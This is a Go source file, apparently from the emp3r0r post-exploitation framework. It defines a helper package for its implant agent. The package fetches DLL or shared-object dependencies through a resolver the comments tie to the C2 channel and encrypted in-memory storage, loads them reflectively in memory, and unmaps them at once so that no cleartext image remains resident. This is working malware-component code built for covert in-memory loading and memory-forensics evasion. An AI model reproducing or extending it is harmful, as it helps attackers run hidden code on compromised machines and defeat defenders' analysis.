// Package memdeps is the single place where in-memory DLL/SO dependency
// modules are mapped and, crucially, unmapped again.
//
// A dependency image (the Windows COFFLoader DLL, the Linux libbpf shared
// object, a module's own DLL, ...) must never stay resident in cleartext once
// the code that needed it has finished. Callers therefore do not get to keep a
// *memmod.Module: they run inside Use/Run, and the mapping is released when
// the callback returns, on both success and failure (including panics).
//
// The raw dependency bytes still live in encrypted memfs and are re-fetched on
// demand through the resolver wired by the agent (SetResolver).
package memdeps

import (
	"errors"
	"fmt"
	"sync"

	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
)

var (
	resolverMu sync.RWMutex
	resolver   func(name string) ([]byte, error)
)

// SetResolver wires the function that fetches a named dependency's raw bytes.
// The agent points this at its memfs/C2 dependency fetcher. Passing nil
// disables resolution (Use then fails).
func SetResolver(fn func(name string) ([]byte, error)) {
	resolverMu.Lock()
	defer resolverMu.Unlock()
	resolver = fn
}

// Use resolves the named dependency, maps it, invokes fn with the mapped
// module, and unmaps it before returning. The mapping never outlives fn.
//
// Any module obtained inside fn is only valid until fn returns; callers must
// not retain it.
func Use(name string, fn func(*memmod.Module) error) error {
	if name == "" {
		return errors.New("memdeps: empty dependency name")
	}
	// Copy the resolver out before releasing the lock: fetching touches
	// memfs/C2 and must not hold a lock.
	resolverMu.RLock()
	fetch := resolver
	resolverMu.RUnlock()
	if fetch == nil {
		return errors.New("memdeps: no dependency resolver configured")
	}
	data, err := fetch(name)
	if err != nil {
		return fmt.Errorf("memdeps: resolve %s: %w", name, err)
	}
	return Run(data, fn)
}

// Run maps data, invokes fn with the mapped module, and unmaps it before
// returning. The mapping never outlives fn.
func Run(data []byte, fn func(*memmod.Module) error) error {
	if len(data) == 0 {
		return errors.New("memdeps: empty module image")
	}
	module, err := memmod.LoadLibrary(data)
	if err != nil {
		return fmt.Errorf("memdeps: map module: %w", err)
	}
	defer module.Free()
	return fn(module)
}
